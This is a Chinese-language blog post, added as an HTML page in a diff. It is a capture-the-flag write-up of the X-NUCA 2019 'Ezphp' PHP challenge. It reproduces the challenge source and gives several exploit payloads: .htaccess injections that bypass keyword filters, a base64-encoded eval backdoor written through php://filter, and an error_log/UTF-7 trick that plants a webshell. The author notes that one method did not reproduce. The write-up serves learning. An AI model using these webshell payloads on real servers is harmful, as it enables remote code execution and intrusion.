@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html>
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    <title>X-NUCA‘2019 ——Ezphp复盘总结 | Xiao Leung&#39;s Blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    
+      <link rel="icon" href="/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="/js/google-code-prettify/tomorrow-night-eighties.min.css">
+
+  </head>
+
+  <body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
+<header>
+	<a id="logo" href="/" title="Xiao Leung&#39;s Blog">
+	<img src="/favicon.png" alt="Xiao Leung&#39;s Blog"></a>
+	
+	
+		<!--搜索栏-->
+		<i class="js-toggle-search iconfont icon-search"></i>
+
+
+<form class="js-search search-form search-form--modal" method="get" action="http://gushi.li" role="search">
+	<div class="search-form__inner">
+		<div>
+			<i class="iconfont icon-search"></i>
+			<input class="text-input" placeholder="Enter Key..." type="search">
+		</div>
+	</div>
+</form>
+	
+
+	
+		<!--侧边导航栏-->
+		<a id="nav-toggle" href="#"><span></span></a>
+
+<nav>
+	<div class="menu-top-container">
+		<ul id="menu-top" class="menu">
+			
+				
+				<li class="current-menu-item">
+					<a href="https://www.plasf.cn/2019/08/01/HelloWorld/" target="_blank">AboutMe</a>
+				</li>
+			
+		</ul>
+	</div>
+</nav>
+	
+
+</header>
+<div class="m-header ">
+	<section id="hero1" class="hero">
+		<div class="inner">
+		</div>
+	</section>
+	
+		<figure class="top-image" data-enable=true></figure>
+	
+</div>
+
+<!--文章列表-->
+<div class="wrapper">
+  
+    <!--文章-->
+<article>
+	
+  
+    <h1 class="post-title" itemprop="name">
+      X-NUCA‘2019 ——Ezphp复盘总结
+    </h1>
+  
+
+	<div class='post-body mb'>
+		<p>emmm….这次比赛题目质量太高所以我这种菜鸡基本没有做出来的题目，但是思路大体正确，但是关键点没有想出来。</p>
+<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><pre><code class="php"> &lt;?php
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    include_once(&quot;fl3g.php&quot;);
+    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
+        highlight_file(__FILE__);
+        die();
+    }
+    $content = $_GET[&#39;content&#39;];
+    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $filename = $_GET[&#39;filename&#39;];
+    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
+        echo &quot;Hacker&quot;;
+        die();
+    }
+    $files = scandir(&#39;./&#39;); 
+    foreach($files as $file) {
+        if(is_file($file)){
+            if ($file !== &quot;index.php&quot;) {
+                unlink($file);
+            }
+        }
+    }
+    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
+?&gt; </code></pre>
+<h2 id="复盘检讨"><a href="#复盘检讨" class="headerlink" title="复盘检讨"></a>复盘检讨</h2><p>其实这题已经想到了使用<code>.htaccess</code>文件去包含php代码但是么有想到怎么绕过<code>stristr()</code>。下面记录一下大佬们的wirte up 所用方法并复现学习一波。</p>
+<ul>
+<li>题目对解析的文件做了限制，只解析index.php，所以做这道题的思路第一反应也是使用<code>.user.ini</code>或者<code>.hatccess</code>去将PHP代码去包含金index.php</li>
+</ul>
+<h3 id="方法一-“-“绕过stristr-检测"><a href="#方法一-“-“绕过stristr-检测" class="headerlink" title="方法一 “\“绕过stristr()检测"></a>方法一 “\“绕过stristr()检测</h3><ul>
+<li><p>我们从代码的最后一行可见最后会强行拼接进来一个<code>&quot;\nJust one chance&quot;</code>导致<code>.hatccess</code>无法解析500错误。所以使用反斜杠可以将<code>\n</code>转义为普通字符后使用#注释使得<code>.hatccess</code>能够成功解析。</p>
+</li>
+<li><p>绕过<code>stristr()</code>检测同样使用“\“作为换行直接绕过该函数的关键字检测。</p>
+</li>
+<li><p>将<code>.hatccess</code>包含进所以php文件。</p>
+</li>
+</ul>
+<pre><code>php_value auto_prepend_file .htaccess</code></pre><ul>
+<li>综上构造payload：</li>
+</ul>
+<pre><code>php_value auto_prepend_fil\ 
+e .htaccess 
+#&lt;?php phpinfo();?&gt;\ </code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190827/15668911161294.png" alt="img"></p>
+<pre><code>?content=php_value auto_prepend_fil\%0Ae .htaccess%0A%23&lt;?php system(&#39;cat /fla&#39;.&#39;g&#39;);?&gt;\&amp;filename=.htaccess</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190827/1566891242808.png" alt="img"></p>
+<h3 id="方法二利用PCRE回溯次数限制绕过正则"><a href="#方法二利用PCRE回溯次数限制绕过正则" class="headerlink" title="方法二利用PCRE回溯次数限制绕过正则"></a>方法二利用PCRE回溯次数限制绕过正则</h3><ul>
+<li><p><code>if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1)</code>存在被绕过的可能。</p>
+</li>
+<li><p><a href="https://www.freebuf.com/articles/web/190794.html" target="_blank" rel="noopener">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+</li>
+<li><p>上文是利用回溯次数超出最大值返回False而这里大佬使用了.hatccess去将回溯次数设置为0导致</p>
+</li>
+</ul>
+<pre><code>?content=php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;filename=.htaccess</code></pre><ul>
+<li>使用<code>php://filter/write=conver.base64-decode=.htaccess</code>写入base64加密的后门，将.htaccess包含入php</li>
+</ul>
+<pre><code>?filename=php://filter/write=convert.base64- 
+decode/resource=.htaccess&amp;content=cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcGhwX3ZhbHVlIHBjcm 
+Uuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiNhPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c </code></pre><ul>
+<li>该方法在我自己搭的环境中并未复现成功。</li>
+</ul>
+<h3 id="利用error-log生成shell"><a href="#利用error-log生成shell" class="headerlink" title="利用error_log生成shell"></a>利用error_log生成shell</h3><ul>
+<li><code>error_lo</code>可以将php的错误信息写在指定目录下</li>
+<li>利用include_path包含UTF-7编码后的一句话</li>
+<li>利用包含文件不存在导致报错在/tmp下生成fl3g.php</li>
+</ul>
+<pre><code>php_value error_log /tmp/fl3g.php
+php_value error_reporting 32767
+php_value include_path &quot;+ADw?php eval($_GET[1])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;
+# \</code></pre><ul>
+<li>生成后再写入如下<code>.htaccess</code>，将include目录更改为tmp和解码UTF-7(<a href="https://www.plasf.cn/2019/08/25/Easy-PHP-Write-up/">上一篇SUCTF</a>博客有提到)</li>
+</ul>
+<pre><code>php_value include_path &quot;/tmp&quot;
+php_value zend.multibyte 1
+php_value zend.script_encoding &quot;UTF-7&quot;
+# \</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190827/15668987829847.png" alt="img"></p>
+<p>（注意写入content使用url编码后传入）</p>
+
+	</div>
+	<div class="meta split">
+		
+			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
+		
+		<time class="post-date" datetime="2019-08-27T05:15:01.000Z" itemprop="datePublished">2019-08-27</time>
+	</div>
+</article>
+
+<!--评论-->
+
+	
+<div class="ds-thread" data-thread-key="2019-8-27-X-NUCA‘2019-Ezphp复现总结" data-title="X-NUCA‘2019 ——Ezphp复盘总结" data-url="http://www.plasf.cn/2019/08/27/2019-8-27-X-NUCA‘2019-Ezphp复现总结/"></div>
+<script type="text/javascript">
+
+var duoshuoQuery = {short_name:"yumemor"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0]
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+</script>
+
+
+  
+</div>
+
+
+  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
+    <path d="M0 0 L50 100 L100 0 Z"></path>
+  </svg>
+
+  
+
+
+  <div class="wrapper"></div>
+
+
+
+
+
+<div class="fat-footer">
+	<div class="wrapper">
+		<div class="layout layout--center">
+			<div class="layout__item palm-mb">
+				<div class="media">
+					<img class="headimg" src='/assets/blogImg/litten.png' alt='XiaoLeung'>
+					<div class="media__body">
+						<h4>Xiaoleung&#39;s Blog</h4>
+						<p class='site-description'>Don&#39;t forget why we started</p>
+					</div>
+				</div>
+				<div class="author-contact">
+					<ul>
+						
+							
+							<li>
+				        		<a href="https://github.com/sharpleung" target="_blank">
+				        			
+				        				<i class="iconfont icon-github"></i>
+				        			
+				        		</a>
+				        	</li>
+						
+					</ul>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+
+<footer class="footer" role="contentinfo">
+	<div class="wrapper wrapper--wide split split--responsive">
+		
+			<span>本站总访问量 <span id="busuanzi_value_site_pv"></span> 次, 访客数 <span id="busuanzi_value_site_uv"></span> 人次</span>
+		
+		<span>Theme by <a href="http://github.com/justpsvm">justpsvm</a>. Powered by <a href="http://hexo.io">Hexo</a></span>
+	</div>
+</footer>
+
+	<!-－这里导入了 lib.js 里面涵盖了 jQuery 等框架 所以注释掉-->
+	<!--<script src="http://lib.sinaapp.com/js/jquery/2.0/jquery.min.js"></script>-->
+	<script src="/js/lib.js"></script>
+	<script src="/js/google-code-prettify/prettify.js"></script>
+	<script src="/js/module.js"></script>
+	<script src="/js/script.js"></script>
+	
+		<script async src="http://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	
+	<script type='text/javascript'>
+		//代码高亮
+		$(document).ready(function(){
+	 		$('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+   			prettyPrint();
+		});
+	</script>
+	<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
